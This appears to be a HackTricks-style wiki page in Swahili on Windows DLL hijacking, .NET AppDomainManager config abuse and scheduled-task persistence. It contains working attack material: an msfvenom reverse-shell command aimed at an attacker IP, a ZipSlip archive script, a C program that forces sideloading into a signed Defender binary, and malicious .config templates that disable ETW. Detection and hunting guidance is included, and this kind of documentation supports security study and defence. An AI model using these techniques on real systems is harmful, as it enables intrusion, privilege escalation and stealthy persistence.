# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking huhusisha kudanganya programu inayoaminika ili ipakie DLL hasidi. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, na Side-Loading**. Hutumiwa hasa kutekeleza code na kudumisha uwepo, na mara chache zaidi, kupandisha mamlaka. Ingawa hapa tunalenga kupandisha mamlaka, mbinu ya hijacking hubaki ileile kwa malengo tofauti.

### Mbinu za Kawaida

Kuna mbinu kadhaa za DLL hijacking, na ufanisi wa kila moja hutegemea jinsi programu inavyopakia DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Kubadilisha DLL halisi na DLL hasidi, kwa hiari kutumia DLL Proxying ili kudumisha utendakazi wa DLL ya awali.
2. **DLL Search Order Hijacking**: Kuweka DLL hasidi kwenye njia ya utafutaji iliyo mbele ya DLL halali, na kutumia mpangilio wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL hasidi ambayo programu itapakia ikidhani kuwa ni DLL inayohitajika lakini haipo.
4. **DLL Redirection**: Kurekebisha vigezo vya utafutaji kama `%PATH%` au faili za `.exe.manifest` / `.exe.local` ili kuelekeza programu kwenye DLL hasidi.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na inayofanana nayo hasidi kwenye saraka ya WinSxS; mbinu hii mara nyingi huhusishwa na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hasidi kwenye saraka inayodhibitiwa na mtumiaji pamoja na programu iliyonakiliwa, sawa na mbinu za Binary Proxy Execution.

Programu inaweza pia kutekeleza **DLL loader yake yenyewe**. Mchakato wenye mamlaka ya juu unaweza kuorodhesha saraka ndogo, kama `Libraries` au `Plugins`, na kupitisha DLL iliyochaguliwa kwa helper, bila kutegemea mpangilio wa kawaida wa utafutaji wa DLL wa Windows. Ikiwa akaunti nyingine inaweza kuunda faili kwenye saraka hiyo mahususi, lichukulie hili kama kidokezo cha uchunguzi: thibitisha utambulisho wa mchakato, ACL halisi ya saraka, kanuni ya kuchagua faili na uwezekano wa kufikia operesheni ya kupakia DLL. Saraka inayoweza kuandikika iliyo karibu na executable haithibitishi kuwa mchakato hupakia DLL kutoka humo.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

Side-loading ya kawaida huacha PE inayoaminika bila kubadilishwa, kisha hushinda katika utatuzi wa jina la DLL. **Import grafting** badala yake hubadilisha PE ambayo tayari imepakiwa na programu inayoaminika. Mshambulizi huongeza import descriptor pamoja na lookup/IAT entries zinazohusiana kwa DLL inayodhibitiwa na mshambuliaji. Windows inapotatua dependency hiyo kwa mfuatano, hupakia DLL iliyoongezwa na kutekeleza msimbo wake wa uanzishaji ndani ya mchakato ambao vinginevyo ungekuwa halali. Huu ni urekebishaji wa PE iliyo kwenye diski, si operesheni sawa na kubadilisha runtime hook inayotumia function pointer ya IAT iliyo hai.<sup>[[31]](#references)[[32]](#references)</sup>

PE iliyorekebishwa inaweza kuwa vendor DLL ya kati badala ya executable inayoanzishwa na mtumiaji au Task Scheduler. Mfuatano unaoweza kutumika tena ni:<sup>[[32]](#references)</sup>

1. Nakili executable halali na dependencies zake kwenye saraka inayodhibitiwa na mshambuliaji.
2. Rekebisha import structures za dependency moja ili zirejelee DLL hasidi, huku ukihifadhi exports zinazotarajiwa za dependency hiyo na utendakazi wake wa kawaida.
3. Sanidi autorun au scheduled task ili ianzishe executable halali. Loader itapakia dependency iliyobadilishwa kisha DLL iliyoingizwa upya. Tazama [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) kwa kuorodhesha tasks.
4. Epuka kuweka kazi nzito kwenye `DllMain`; loader iliyozingatiwa iliunda worker thread na kuendelea na decryption iliyopangwa humo.

Hii ni tofauti na uingiliaji wa supply-chain wa upande wa vendor ikiwa kifurushi cha vendor ni safi na urekebishaji wa import unafanyika baada ya usakinishaji. Chunguza kila module kwenye saraka iliyowekwa, si host EXE pekee: linganisha orodha za import za dependencies na hashes zake na usakinishaji unaojulikana kuwa salama, thibitisha signatures, na chunguza vendor binaries zinazoanzishwa kutoka maeneo yasiyotarajiwa yanayoweza kuandikika kama `C:\ProgramData`. Scheduled task inayoelekeza kwenye crash reporter au updater iliyonakiliwa katika saraka kama hiyo ni kidokezo muhimu sana cha uchunguzi.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading si njia pekee ya kufanya mchakato unaoaminika wa **.NET Framework** upakie msimbo wa mshambuliaji. Ikiwa executable lengwa ni programu ya **managed**, CLR pia hukagua **application configuration file** yenye jina la executable (kwa mfano `Setup.exe.config`). Faili hiyo inaweza kufafanua **AppDomainManager** maalum. Ikiwa config inaelekeza kwenye assembly inayodhibitiwa na mshambuliaji na iliyowekwa karibu na EXE, CLR huipakia **kabla ya njia ya kawaida ya msimbo wa programu** na kuiendesha ndani ya mchakato unaoaminika.<sup>[[24]](#references)</sup>

Kulingana na schema ya usanidi ya .NET Framework ya Microsoft, `<appDomainManagerAssembly>` na `<appDomainManagerType>` lazima zote ziwepo ili manager maalum itumike.<sup>[[16]](#references)[[17]](#references)</sup>

Config ya chini kabisa:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Msimamizi wa kiwango cha chini:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Maelezo ya vitendo:
- Hii ni mbinu mahususi kwa **.NET Framework**. Inategemea uchanganuzi wa usanidi wa CLR, si mpangilio wa utafutaji wa Win32 DLL.
- Programu mwenyeji lazima kweli iwe **managed EXE**. Ukaguzi wa haraka: `sigcheck -m target.exe`, `corflags target.exe`, au angalia **CLR Runtime Header** kwenye metadata ya PE.
- Jina la faili la usanidi lazima lilingane kabisa na jina la executable (`<binary>.config`) na kwa kawaida huwa **karibu na EXE**.
- Hii ni muhimu kwa kutumia **binaries za Microsoft/vendor zilizosainiwa** kwa sababu EXE inayoaminika hubaki bila kuguswa huku managed assembly hasidi ikitekelezwa ndani ya mchakato.
- Ikiwa tayari una saraka ya kisakinishi/sasisho inayoweza kuandikika, utekaji wa AppDomainManager unaweza kutumiwa kama **hatua ya kwanza**, ikifuatiwa na DLL sideloading ya kawaida au reflective loading kwa hatua zinazofuata.

### AppDomainManager kama kipakua + bootstrap ya scheduled task

Muundo wa vitendo wa uvamizi ni kuoanisha managed EXE inayoaminika na `*.config` hasidi pamoja na AppDomainManager DLL hasidi inayofanya kazi kama **bootstrapper ndogo**:<sup>[[25]](#references)</sup>

1. Mtumiaji huzindua kisakinishi au sasishaji wa .NET uliosainiwa kutoka eneo linaloaminika, kama `%USERPROFILE%\Downloads`.
2. Config iliyo karibu husababisha CLR kupakia assembly ya mshambuliaji **kabla** mantiki halali ya programu haijaanza.
3. Manager hasidi hutekeleza **path gate** (kwa mfano, huendelea tu ikiwa host EXE inaendeshwa kutoka `Downloads`, na huruhusu hatua ya pili kuendeshwa tu kutoka `%LOCALAPPDATA%`).
4. Ikiwa ukaguzi utafaulu, hupakua payload halisi hadi kwenye njia inayoweza kuandikika na mtumiaji, kama `%LOCALAPPDATA%\PerfWatson2.exe`, na kusakinisha persistence kwa kutumia scheduled task.

Kwa nini aina hii ni muhimu:
- Host EXE iliyosainiwa hubaki bila kubadilishwa, kwa hiyo triage inayohash binary kuu pekee inaweza kukosa kompromasi.
- **Uchambuzi wa kupinga unaotegemea njia** ni wa kawaida: kuhamisha jozi ya ZIP/EXE/DLL hadi Desktop, Temp, au njia ya sandbox kunaweza kuvunja mnyororo kimakusudi.
- AppDomainManager DLL ya hatua ya kwanza inaweza kubaki ndogo na isiyoleta kelele nyingi huku implant halisi ikipakuliwa baadaye.

Mfano mdogo wa persistence unaoonekana mara nyingi katika muundo huu:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Maelezo:
- ` /rl highest` inamaanisha **kiwango cha juu zaidi kinachopatikana** kwa mtumiaji/session hiyo; chenyewe hakihakikishi kupandishwa hadi SYSTEM.
- Mbinu hii mara nyingi huainishwa vizuri zaidi kama **utekelezaji/udumishaji kupitia matumizi mabaya ya usanidi wa .NET** badala ya utekaji wa kawaida wa mpangilio wa utafutaji wa DLL zisizokuwepo, ingawa waendeshaji mara nyingi huzichanganya zote mbili.

Viashiria vya utambuzi:
- Executable za .NET zilizosainiwa zinazoendeshwa kutoka **njia za uchimbuaji wa ZIP**, `Downloads`, `%TEMP%`, au folda nyingine zinazoweza kuandikwa na mtumiaji, zikiwa na faili ya `<exe>.config` **katika folda hiyo hiyo**.
- Scheduled task mpya ambazo kitendo chake kinaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au `Downloads`, na majina yake yanaiga yale ya visasishi vya kivinjari/vendor.
- Michakato ya muda mfupi ya bootstrap inayotumia managed code na inayopakua EXE nyingine mara moja, kisha kuanzisha `schtasks.exe`.
- Samples zinazoacha kufanya kazi mapema isipokuwa njia ya executable ilingane na folda ya wasifu wa mtumiaji inayotarajiwa.

### Hijacking scheduled task iliyopo ili kuzindua upya sideload chain

Kwa ajili ya persistence, usitafute tu **kuunda task mpya**. Baadhi ya makundi ya wavamizi husubiri hadi installer halali iunde **task ya kawaida ya kusasisha**, kisha **huandika upya kitendo cha task** ili jina, mwandishi na kichochezi kilichopo viendelee kuonekana vya kawaida kwa wanaojilinda.

Mtiririko wa kazi unaoweza kutumika tena:
1. Sakinisha/endesha software halali na utambue task ambayo kwa kawaida huunda.
2. Hamisha task XML na uandike thamani za sasa za `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Badilisha kitendo pekee ili task ianzishe **host EXE unayoamini** kutoka kwenye folda ya maandalizi inayoweza kuandikwa na mtumiaji, ambayo kisha hupakia payload kwa sideload au AppDomain.
4. Sajili tena jina lilelile la task badala ya kuunda artifact mpya ya persistence iliyo wazi.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Kwa nini ni vigumu zaidi kugundua:
- Jina la task bado linaweza kuonekana halali (kwa mfano, updater ya vendor).
- **Task Scheduler service** ndiyo inayoizindua, kwa hivyo ukaguzi wa parent/ancestor mara nyingi huona mfuatano wa kawaida wa ratiba badala ya `explorer.exe`.
- Timu za DFIR zinazotafuta tu **majina mapya ya task** zinaweza kukosa task ambayo usajili wake ulikuwepo tayari, lakini action yake sasa inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au njia nyingine inayodhibitiwa na mshambuliaji.

Njia za haraka za uchunguzi:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Linganisha XML za `C:\Windows\System32\Tasks\*` na metadata ya `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` na baseline.
- Toa tahadhari wakati **task ya updater inayoonekana kuwa ya vendor** inaendesha kutoka **directories zinazoweza kuandikiwa na mtumiaji** au inapozindua .NET EXE yenye faili ya `*.config` iliyo kwenye directory hiyo hiyo.

> [!TIP]
> Kwa mfuatano wa hatua kwa hatua unaoweka HTML staging, AES-CTR configs, na .NET implants juu ya DLL sideloading, pitia workflow iliyo hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Kuhusisha stage iliyopakiwa kando na command line ya service

DLL iliyopakiwa kando inaweza kuhitaji zaidi ya jina linalotarajiwa la host EXE na DLL. Mandiant ilieleza loader inayofungamanisha usimbuaji wa payload na command-line argument pamoja na jina la executable ya host.<sup>[[33]](#references)</sup> Katika mfuatano wa baadaye uliotumia service, host halali iliyonakiliwa ilipakia `mscoree.dll` jirani, iliyotoa `LockClrVersion`, na kusimbua stage yake iliyopachikwa baada tu ya kupata ufunguo wa AES-128 kutoka kwa argument ya service na basename ya executable ya host. Kila ingizo lilikatwa au kujazwa NUL hadi kufikia baiti 16; ufunguo wa bytewise ulikuwa `argument XOR embedded_key XOR executable_basename`, kisha payload ilisimbuliwa kwa AES-CBC bila padding. Kubadilisha jina la host au kuizindua bila argument iliyotarajiwa hubadilisha ufunguo na kuzuia stage hii kusimbuliwa, hata kama DLL bado inapakiwa. Hifadhi command-line argument na basename halisi unapoiga au kuchanganua variant hii.<sup>[[34]](#references)</sup>

Hii ni **kizuizi cha payload kilichowekwa juu ya DLL side-loading ya kawaida**, si kanuni mpya ya mpangilio wa utafutaji wa DLL wala mbinu ya kupandisha ruhusa yenyewe. Muktadha wa usalama wa service huamua kiwango cha ruhusa kinachopatikana. Workflow ya [GitHub issue/file C2](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) inaeleza usafirishaji wa baadaye kando.<sup>[[34]](#references)</sup>

## Kutafuta DLL zinazokosekana

Njia ya kawaida zaidi ya kutafuta DLL zinazokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **ukiweka** **filters 2 zifuatazo**:

![Mbinu za Kawaida - Kutafuta DLL zinazokosekana: Njia ya kawaida zaidi ya kutafuta DLL zinazokosekana ndani ya mfumo ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (961).png>)

![Mbinu za Kawaida - Kutafuta DLL zinazokosekana: Njia ya kawaida zaidi ya kutafuta DLL zinazokosekana ndani ya mfumo ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (230).png>)

kisha uonyeshe **File System Activity** pekee:

![Mbinu za Kawaida - Kutafuta DLL zinazokosekana: kisha uonyeshe File System Activity pekee](<../../../images/image (153).png>)

Ikiwa unatafuta **DLL zinazokosekana kwa ujumla**, **iache** ikiendelea kwa **sekunde** kadhaa.\
Ikiwa unatafuta **DLL inayokosekana ndani ya executable maalum**, weka filter nyingine kama **"Process Name" "contains" `<exec name>`**, iendeshe, kisha usimamishe kunasa matukio.<sup>[[9]](#references)</sup>

## Kutumia DLL zinazokosekana vibaya

Ili kupandisha ruhusa, tafuta **DLL ambayo mchakato wenye ruhusa za juu hujaribu kuipakia** kutoka eneo unaloweza kuandikia. Hili linaweza kutokea unapodhibiti directory inayotafutwa kabla ya directory iliyo na DLL halali, au wakati DLL iliyoombwa haipo na unaweza kuandikia mojawapo ya directories zinazotafutwa.

### Mpangilio wa Utafutaji wa DLL

**Ndani ya** [**hati za Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kuona jinsi DLL zinavyopakiwa hasa.**

**Programu za Windows** hutafuta DLL kwa kufuata seti ya **njia za utafutaji zilizobainishwa awali**, kwa mfuatano maalum. Tatizo la DLL hijacking hutokea wakati DLL hasidi inapowekwa kimkakati katika mojawapo ya directories hizi ili ipakiwe kabla ya DLL halisi. Njia ya kuzuia hili ni kuhakikisha programu inatumia absolute paths inapozirejelea DLL inazohitaji.

Unaweza kuona **mpangilio wa utafutaji wa DLL kwenye mifumo ya 32-bit** hapa chini:

1. Directory ambayo programu ilipakiwa kutoka humo.
2. System directory. Tumia function ya [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) kupata njia ya directory hii.(_C:\Windows\System32_)
3. System directory ya 16-bit. Hakuna function inayopata njia ya directory hii, lakini hutafutwa. (_C:\Windows\System_)
4. Windows directory. Tumia function ya [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) kupata njia ya directory hii.
   1. (_C:\Windows_)
5. Directory ya sasa.
6. Directories zilizoorodheshwa kwenye environment variable ya PATH. Kumbuka kwamba hii haijumuishi njia ya kila programu iliyoainishwa na registry key ya **App Paths**. Key ya **App Paths** haitumiki wakati wa kukokotoa njia ya utafutaji wa DLL.

Huu ndio mpangilio wa utafutaji wa **chaguo-msingi** wakati **SafeDllSearchMode** imewezeshwa. Ikiwa imezimwa, directory ya sasa hupanda hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza registry value ya **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kuwa 0 (chaguo-msingi ni imewezeshwa).

Ikiwa function ya [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) itaitwa kwa **LOAD_WITH_ALTERED_SEARCH_PATH**, utafutaji huanza kwenye directory ya executable module ambayo **LoadLibraryEx** inapakia.

Hatimaye, DLL inaweza kupakiwa kwa absolute path badala ya jina. Katika hali hiyo, Windows hutafuta DLL yenyewe kwenye njia hiyo pekee; dependencies zinazoombwa kwa jina bado hufuata mpangilio husika wa utafutaji.

Kuna njia nyingine za kubadilisha mpangilio wa utafutaji, lakini sitazieleza hapa.

### Kuunganisha uandishi wa faili kiholela na utekaji wa DLL inayokosekana

**Mbinu inayohusiana:** [oplock-gated mount-point switching dhidi ya urekebishaji wenye ruhusa za juu](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Tumia filters za **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambayo mchakato hujaribu kuyapata lakini hauyapati.<sup>[[14]](#references)</sup>
2. Ikiwa binary inaendeshwa kwa **ratiba/service**, kuweka DLL yenye mojawapo ya majina hayo kwenye **application directory** (nafasi ya #1 katika mpangilio wa utafutaji) kutaisababisha kupakiwa wakati wa utekelezaji unaofuata. Katika kisa kimoja cha .NET scanner, mchakato ulitafuta `hostfxr.dll` kwenye `C:\samples\app\` kabla ya kupakia nakala halisi kutoka `C:\Program Files\dotnet\fxr\...`.
3. Tengeneza payload DLL (k.m. reverse shell) yenye export yoyote: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ikiwa primitive yako ni **uandishi wa kiholela wa mtindo wa ZipSlip**, tengeneza ZIP yenye entry inayotoka nje ya directory ya uchimbuaji ili DLL iwekwe kwenye app folder:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Peleka archive kwenye inbox/share inayofuatiliwa; task iliyoratibiwa itakapozindua tena process, itapakia DLL hasidi na kutekeleza code yako kama akaunti ya huduma.

### Kulazimisha sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya juu ya kudhibiti kwa uhakika DLL search path ya process mpya ni kuweka sehemu ya DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda process kwa kutumia native APIs za ntdll. Kwa kuweka directory inayodhibitiwa na mshambulizi hapa, process lengwa inayotafuta DLL iliyoingizwa kwa jina (bila absolute path na bila kutumia safe loading flags) inaweza kulazimishwa kupakia DLL hasidi kutoka directory hiyo.

Wazo kuu
- Unda process parameters kwa kutumia RtlCreateProcessParametersEx na uweke DllPath maalum inayoelekeza kwenye folder unalodhibiti (k.m., directory ilipo dropper/unpacker yako).
- Unda process kwa kutumia RtlCreateUserProcess. Binary lengwa inapotafuta DLL kwa jina, loader itatumia DllPath hii iliyotolewa wakati wa utafutaji, hivyo kuwezesha sideloading ya uhakika hata kama DLL hasidi haipo kwenye directory moja na target EXE.

Maelezo/vikwazo
- Hili huathiri child process inayoundwa; ni tofauti na SetDllDirectory, ambayo huathiri process ya sasa pekee.
- Target lazima iweke DLL kwenye imports au iite LoadLibrary kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na absolute paths zilizoandikwa moja kwa moja haziwezi kuhijackiwa. Forwarded exports na SxS zinaweza kubadilisha mpangilio wa kipaumbele.

Mfano mdogo wa C (ntdll, wide strings, ushughulikiaji wa makosa uliorahisishwa):

<details>
<summary>Mfano kamili wa C: kulazimisha DLL sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Mfano wa matumizi ya kiutendaji
- Weka xmllite.dll hasidi (inayotoa functions zinazohitajika au kuelekeza maombi kwa DLL halisi) kwenye directory yako ya DllPath.
- Zindua binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina kwa kutumia technique iliyo hapo juu. Loader hutatua import kupitia DllPath iliyotolewa na kusideload DLL yako.

Technique hii imeonekana ikitumika porini kuendesha minyororo ya sideloading ya hatua nyingi: launcher ya awali huweka helper DLL, ambayo kisha huzindua binary iliyosainiwa na Microsoft inayoweza kuhijackiwa, ikiwa na DllPath maalum ili kulazimisha kupakiwa kwa DLL ya mshambuliaji kutoka kwenye staging directory.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

Kwa targets za **.NET Framework**, sideloading inaweza kufanywa **kabla ya `Main()`** bila kubadilisha memory kwa kutumia vibaya faili ya **`.exe.config`** iliyo karibu na programu. Badala ya kutegemea tu mpangilio wa utafutaji wa Win32 DLL, mshambuliaji huweka .NET EXE halali kando ya config hasidi na assembly moja au zaidi zinazodhibitiwa na mshambuliaji.

Jinsi mnyororo huu unavyofanya kazi:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE huanza na **CLR husoma `<exe>.config`**.
2. Config huweka **`<appDomainManagerAssembly>`** na **`<appDomainManagerType>`** ili runtime iunde `AppDomainManager` inayodhibitiwa na mshambuliaji.
3. Manager hasidi hupata **utekelezaji kabla ya `Main()`** ndani ya mchakato wa host unaoaminika.
4. Config hiyo hiyo inaweza kulazimisha CLR kutatua assembly za ndani kwanza (kwa mfano `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) na inaweza kudhoofisha uthibitishaji/telemetry ya runtime bila inline patching.

Muundo wa aina ya kampeni (upachikaji halisi unaweza kutofautiana kulingana na directive / toleo la CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Kwa nini hii ni muhimu:
- **`<probing privatePath="."/>`** huweka assembly resolution kwenye application directory, na kuifanya folder hiyo kuwa eneo linalotabirika la sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** huhamishia execution kwenye attacker code wakati wa CLR initialization, kabla ya logic halali ya app kuanza.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** inaweza kuruhusu full-trust app kupakia assemblies zisizosainiwa au zilizobadilishwa bila kushindwa kwa strong-name validation.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** huepusha publisher-policy redirects kwenda kwenye assemblies mpya zaidi.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** hufanya runtime selection iwe thabiti zaidi.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** inavutia hasa kwa sababu **CLR huzima ETW visibility yake yenyewe** kupitia configuration, badala ya implant kurekebisha `EtwEventWrite` kwenye memory.

Mfumo wa utekelezaji ulioonekana katika kampeni za hivi karibuni:
- Hatua ya 1 huweka `setup.exe`, `setup.exe.config`, na local assemblies.
- Hatua ya 2 huzinakili kwenye folder inayoaminika ya **AppData update**, hubadilisha jina la host kuwa kama `update.exe`, kisha huiwasha upya kupitia **scheduled task**.
- Hatua ya 3 huthibitisha execution context (kwa mfano, parent inayotarajiwa ni `svchost.exe` kutoka Task Scheduler) kabla ya kupakia RAT DLL/export ya mwisho.

Mawazo ya kutafuta:
- **.NET executables** zilizosainiwa au zinazoaminika kwa njia nyingine, zinazoendeshwa pamoja na **`.config`** files zinazotiliwa shaka katika maeneo yanayoweza kuandikiwa na watumiaji.
- `.config` files zilizo na **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, au **`etwEnable enabled="false"`**.
- Scheduled tasks zinazoanzisha upya update binaries zilizopewa majina mengine kutoka **`%LOCALAPPDATA%`** au directories maalum za app za `\bin\update\`.
- Minyororo ya parent/child ambapo scheduled task huanzisha trusted .NET host ambayo hupakia mara moja non-vendor assemblies kutoka kwenye directory yake yenyewe.

#### Isipokuwa katika mpangilio wa utafutaji wa DLL kulingana na nyaraka za Windows

Nyaraka za Windows zinataja baadhi ya hali zisizofuata mpangilio wa kawaida wa utafutaji wa DLL:

- Mfumo unapokutana na **DLL yenye jina sawa na ile ambayo tayari imepakiwa kwenye memory**, huruka utafutaji wa kawaida. Badala yake, hukagua redirection na manifest kabla ya kutumia DLL ambayo tayari iko kwenye memory. **Katika hali hii, mfumo hautafuti DLL**.
- DLL inapotambuliwa kama **known DLL** kwa toleo la sasa la Windows, mfumo hutumia toleo lake la known DLL, pamoja na DLL zote inazotegemea, **bila kufanya utafutaji**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** ina orodha ya known DLL hizi.
- **DLL ikiwa na dependencies**, utafutaji wa DLL hizo tegemezi hufanywa kana kwamba zilitajwa kwa **majina ya module pekee**, bila kujali kama DLL ya awali ilitambuliwa kupitia full path.

### Kupandisha Privileges

**Mahitaji**:

- Tambua process inayoendeshwa au itakayoendeshwa kwa **privileges tofauti** (horizontal au lateral movement), na **isiyo na DLL**.
- Hakikisha kuna **write access** kwenye **directory** yoyote ambayo **DLL** itatafutwa. Hii inaweza kuwa directory ya executable au directory iliyo ndani ya system path.

Masharti haya si ya kawaida kwa chaguo-msingi: executables zenye privileges za juu kwa kawaida hazikosi DLL dependencies, na watumiaji wa kawaida kwa kawaida hawawezi kuandika kwenye system search-path directories. Hata hivyo, mazingira yaliyosanidiwa vibaya yanaweza kufichua masharti yote mawili.\
